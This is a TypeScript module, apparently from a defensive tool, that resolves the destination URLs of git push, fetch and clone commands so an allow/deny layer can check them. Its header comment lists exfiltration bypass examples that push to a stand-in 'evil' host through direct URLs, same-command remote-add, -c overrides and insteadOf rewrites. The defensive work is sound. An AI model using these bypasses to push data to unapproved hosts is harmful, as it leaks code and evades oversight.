/**
 * Configured-remote resolver for v0.6.11 commit 6.
 *
 * Given a parsed `git` invocation (verb + remote arg + -c flags + same-
 * command remote-add mutations) and a parsed `.git/config`, return the
 * URL(s) the operation will hit AND a confidence flag the enforcement
 * layer (commit 8) reads.
 *
 * Per design 3.4 + watch-out #3: this closes the smuggle vectors:
 *   - direct argv URL                     `git push https://evil HEAD`
 *   - same-command remote-add + push      `git remote add x evil; git push x`
 *   - `-c` runtime override               `git -c remote.x.url=evil push x`
 *   - url.insteadOf rewrite chains        `[url "https://evil/"] insteadOf = "https://github.com/"`
 *   - pushInsteadOf push-only rewrite
 *   - remote.<name>.pushurl push-specific URL
 *
 * The resolver does NOT touch the filesystem; the caller passes the
 * parsed config text. For `include.path` chains the caller must
 * pre-resolve before calling — under taint the enforcement layer treats
 * an unresolvable destination as deny.
 *
 * Public output:
 *   { urls: string[], resolved: boolean, source, applied_rewrites: [] }
 *
 * The enforcement layer feeds each URL through `decideUrlPolicy` from
 * the commit-5 URL module to get the final allow/deny.
 */

import {
	type GitConfig,
	getConfigValue,
	getConfigValues,
	mergeGitConfig,
	configFromFlat,
} from "./parse-config.js";

export interface ResolveInput {
	/** Git subcommand verb: push / fetch / pull / clone / ls-remote / submodule */
	verb: string;
	/** The positional remote argument (a remote name or a URL). May be undefined. */
	remoteArg?: string;
	/**
	 * `-c key=value` overrides parsed from the argv. Keys are dot-paths
	 * like `remote.x.url` or `url.PREFIX.insteadOf`. Order matters
	 * (last wins), but the resolver is fed the already-merged map.
	 */
	cFlags?: Record<string, string>;
	/**
	 * Mutations from earlier commands in the same Bash sequence —
	 * specifically `git remote add NAME URL` and `git config remote.X.url URL`.
	 * The parser in commit 4's sequence detection populates this.
	 */
	configMutations?: Record<string, string>;
}

export type ResolveSource =
	| "argv_url"
	| "remote_name"
	| "remote_added_in_command"
	| "c_flag_override"
	| "default_origin"
	| "unresolved";

export interface AppliedRewrite {
	from: string;
	to: string;
	rule: string; // "url.PREFIX.insteadOf=SHORT" etc.
	mode: "fetch" | "push" | "both";
}

export interface ResolveResult {
	urls: string[];
	push_urls?: string[];
	resolved: boolean;
	source: ResolveSource;
	/** Audit-friendly reason string when unresolved. */
	reason?: string;
	applied_rewrites: AppliedRewrite[];
}

/** Sub-verbs that are network-bound and warrant URL resolution. */
const NETWORK_VERBS = new Set([
	"push",
	"fetch",
	"pull",
	"clone",
	"ls-remote",
	"archive",
	"submodule",
]);

/** Verbs whose URL form the destination as-is when given as argv. */
const ACCEPTS_DIRECT_URL = new Set([
	"push",
	"fetch",
	"pull",
	"clone",
	"ls-remote",
]);

const URL_LIKE = /^(https?:\/\/|git[@+]|git:\/\/|ssh:\/\/|file:\/\/)/i;
const SCP_LIKE = /^[A-Za-z0-9._-]+@[A-Za-z0-9._-]+:/;

function looksLikeUrl(s: string): boolean {
	return URL_LIKE.test(s) || SCP_LIKE.test(s);
}

/**
 * Apply url.<PREFIX>.insteadOf and pushInsteadOf rewrites to a single
 * URL, longest-prefix-wins per git semantics. Returns the rewritten URL
 * plus the rewrite record (or original URL + empty record).
 */
function applyInsteadOfRewrites(
	url: string,
	config: GitConfig,
	mode: "fetch" | "push",
): { url: string; rewrite?: AppliedRewrite } {
	const sections = config.sections;
	let bestPrefix = "";
	let bestSection = "";
	let bestKey = "";
	for (const [secKey, secVal] of Object.entries(sections)) {
		if (!secKey.startsWith("url.")) continue;
		const prefix = secKey.slice(4); // strip "url."
		const insteadOfShorts = secVal["insteadof"] ?? [];
		const pushInsteadOfShorts = secVal["pushinsteadof"] ?? [];
		const candidates: { short: string; key: string }[] = [];
		for (const s of insteadOfShorts) {
			candidates.push({ short: s, key: "insteadOf" });
		}
		if (mode === "push") {
			for (const s of pushInsteadOfShorts) {
				candidates.push({ short: s, key: "pushInsteadOf" });
			}
		}
		for (const c of candidates) {
			if (url.startsWith(c.short) && c.short.length > bestPrefix.length) {
				bestPrefix = c.short;
				bestSection = prefix;
				bestKey = c.key;
			}
		}
	}
	if (bestPrefix === "") return { url };
	const rewritten = bestSection + url.slice(bestPrefix.length);
	return {
		url: rewritten,
		rewrite: {
			from: url,
			to: rewritten,
			rule: `url.${bestSection}.${bestKey}=${bestPrefix}`,
			mode,
		},
	};
}

/**
 * Resolve a remote name to its fetch/push URLs against the config.
 * Returns null if the remote name is not configured.
 */
function lookupRemote(
	name: string,
	config: GitConfig,
): { url?: string; pushurl?: string } | null {
	const sec = config.sections[`remote.${name.toLowerCase()}`];
	if (!sec) return null;
	const url = sec["url"]?.[0];
	const pushurl = sec["pushurl"]?.[0];
	if (url === undefined && pushurl === undefined) return null;
	return { url, pushurl };
}

/**
 * Build the effective config by overlaying `-c` flags and same-command
 * mutations on top of the base. Caller-provided ordering controls
 * precedence: cFlags last, then configMutations, then base — i.e. the
 * resolver applies cFlags ON TOP of mutations, which apply ON TOP of base.
 */
function buildEffectiveConfig(
	base: GitConfig,
	mutations: Record<string, string> | undefined,
	cFlags: Record<string, string> | undefined,
): GitConfig {
	let cfg = base;
	if (mutations && Object.keys(mutations).length > 0) {
		cfg = mergeGitConfig(cfg, configFromFlat(mutations));
	}
	if (cFlags && Object.keys(cFlags).length > 0) {
		cfg = mergeGitConfig(cfg, configFromFlat(cFlags));
	}
	return cfg;
}

/**
 * Public entry — resolve the URLs a git invocation will hit.
 *
 * Decision tree (and why each branch is needed):
 *   1. verb is not network → no URLs to resolve, return resolved=true
 *      with empty urls (caller can skip allowlist check).
 *   2. argv contains a URL-shaped remoteArg → that's the destination.
 *      Apply url.insteadOf rewrites. (Closes "git push https://evil HEAD".)
 *   3. remoteArg is a configured remote name (after merging mutations
 *      and cFlags) → use remote.<name>.url + pushurl. Apply rewrites.
 *      (Closes "remote add x evil; push x" via mutations and
 *      "-c remote.x.url=evil push x" via cFlags.)
 *   4. remoteArg is unset and verb is `push|fetch|pull` → default to
 *      `origin`.
 *   5. None of the above resolve → unresolved.
 */
export function resolveGitRemote(input: ResolveInput, base: GitConfig): ResolveResult {
	const verb = input.verb.toLowerCase();
	if (!NETWORK_VERBS.has(verb)) {
		return {
			urls: [],
			resolved: true,
			source: "unresolved",
			reason: "non-network verb",
			applied_rewrites: [],
		};
	}

	const config = buildEffectiveConfig(
		base,
		input.configMutations,
		input.cFlags,
	);

	const arg = input.remoteArg;
	const rewrites: AppliedRewrite[] = [];

	const finalize = (
		urlsRaw: string[],
		pushUrlsRaw: string[] | undefined,
		source: ResolveSource,
	): ResolveResult => {
		const isPush = verb === "push";
		const fetchMode: "fetch" | "push" = "fetch";
		const pushMode: "fetch" | "push" = "push";
		const fetchUrls = urlsRaw.map((u) => {
			const r = applyInsteadOfRewrites(u, config, isPush ? pushMode : fetchMode);
			if (r.rewrite) rewrites.push(r.rewrite);
			return r.url;
		});
		let pushUrls: string[] | undefined = undefined;
		if (pushUrlsRaw) {
			pushUrls = pushUrlsRaw.map((u) => {
				const r = applyInsteadOfRewrites(u, config, "push");
				if (r.rewrite) rewrites.push(r.rewrite);
				return r.url;
			});
		}
		return {
			urls: fetchUrls,
			push_urls: pushUrls,
			resolved: true,
			source,
			applied_rewrites: rewrites,
		};
	};

	// Direct URL argument
	if (arg && looksLikeUrl(arg) && ACCEPTS_DIRECT_URL.has(verb)) {
		return finalize([arg], undefined, "argv_url");
	}

	// Configured remote name
	if (arg !== undefined && !looksLikeUrl(arg)) {
		const remote = lookupRemote(arg, config);
		if (remote) {
			const fetchUrls = remote.url ? [remote.url] : [];
			const pushUrls = remote.pushurl ? [remote.pushurl] : undefined;
			let source: ResolveSource = "remote_name";
			// Order matters: cFlags applied LAST in buildEffectiveConfig
			// so they win the value. Source attribution follows the same
			// last-wins rule.
			if (
				input.cFlags &&
				Object.keys(input.cFlags).some((k) =>
					k.toLowerCase().startsWith(`remote.${arg.toLowerCase()}.`),
				)
			) {
				source = "c_flag_override";
			} else if (
				input.configMutations &&
				Object.keys(input.configMutations).some((k) =>
					k.toLowerCase().startsWith(`remote.${arg.toLowerCase()}.`),
				)
			) {
				source = "remote_added_in_command";
			}
			if (fetchUrls.length === 0 && !pushUrls) {
				return {
					urls: [],
					resolved: false,
					source: "unresolved",
					reason: `remote "${arg}" has no url or pushurl configured`,
					applied_rewrites: rewrites,
				};
			}
			return finalize(fetchUrls, pushUrls, source);
		}
	}

	// Default to origin for unspecified push/fetch/pull
	if (arg === undefined && (verb === "push" || verb === "fetch" || verb === "pull")) {
		const origin = lookupRemote("origin", config);
		if (origin && origin.url) {
			return finalize(
				[origin.url],
				origin.pushurl ? [origin.pushurl] : undefined,
				"default_origin",
			);
		}
	}

	return {
		urls: [],
		resolved: false,
		source: "unresolved",
		reason: arg
			? `cannot resolve remote argument "${arg}"`
			: "no remote argument and no origin configured",
		applied_rewrites: rewrites,
	};
}

/**
 * Convenience: parse a `git` argv (after compound-prefix unwrap from
 * commit 4) and extract the verb + remote arg + -c flag pairs the
 * resolver needs. Returns `null` if the argv isn't recognizably a `git`
 * invocation.
 */
export interface ParsedGitArgv {
	verb: string;
	remoteArg?: string;
	cFlags: Record<string, string>;
}

export function parseGitArgv(argv: string[]): ParsedGitArgv | null {
	if (argv.length === 0) return null;
	const head = argv[0].toLowerCase().split("/").pop();
	if (head !== "git") return null;
	const cFlags: Record<string, string> = {};
	let i = 1;
	while (i < argv.length) {
		const tok = argv[i];
		if (tok === "-c" && i + 1 < argv.length) {
			const pair = argv[i + 1];
			const eq = pair.indexOf("=");
			if (eq > 0) {
				cFlags[pair.slice(0, eq)] = pair.slice(eq + 1);
			}
			i += 2;
			continue;
		}
		if (tok.startsWith("-")) {
			i++;
			continue;
		}
		break;
	}
	if (i >= argv.length) return null;
	const verb = argv[i].toLowerCase();
	i++;
	// Skip subverb-flags until we see the first positional that looks
	// like a remote name or URL.
	let remoteArg: string | undefined;
	while (i < argv.length) {
		const tok = argv[i];
		if (tok.startsWith("-")) {
			i++;
			continue;
		}
		remoteArg = tok;
		break;
	}
	return { verb, remoteArg, cFlags };
}

/**
 * Same-command mutation extraction: scan a Bash sequence's children
 * (parsed by commit 4) for `git remote add <name> <url>` and
 * `git config remote.<name>.url <url>` entries that come BEFORE a
 * `git push <name>` in the same sequence. Returns the merged
 * mutation map keyed by `remote.<name>.url`.
 *
 * The caller (commit 8) constructs the per-pipeline view: it walks the
 * sequence_unconditional / sequence_and children left-to-right and
 * accumulates mutations until it hits the verb-of-interest.
 */
export function extractMutationsFromArgv(argvList: string[][]): Record<string, string> {
	const out: Record<string, string> = {};
	for (const argv of argvList) {
		if (argv.length < 2) continue;
		const head = argv[0].toLowerCase().split("/").pop();
		if (head !== "git") continue;
		// Skip -c pairs and other flags
		let i = 1;
		while (i < argv.length) {
			const tok = argv[i];
			if (tok === "-c" && i + 1 < argv.length) {
				i += 2;
				continue;
			}
			if (tok.startsWith("-")) {
				i++;
				continue;
			}
			break;
		}
		if (i >= argv.length) continue;
		const sub1 = argv[i].toLowerCase();
		// `git remote add NAME URL`
		if (sub1 === "remote" && argv[i + 1]?.toLowerCase() === "add") {
			const name = argv[i + 2];
			const url = argv[i + 3];
			if (name && url) {
				out[`remote.${name.toLowerCase()}.url`] = url;
			}
			continue;
		}
		// `git config remote.NAME.url URL`
		if (sub1 === "config") {
			const key = argv[i + 1];
			const value = argv[i + 2];
			if (key && value) {
				out[key.toLowerCase()] = value;
			}
			continue;
		}
	}
	return out;
}
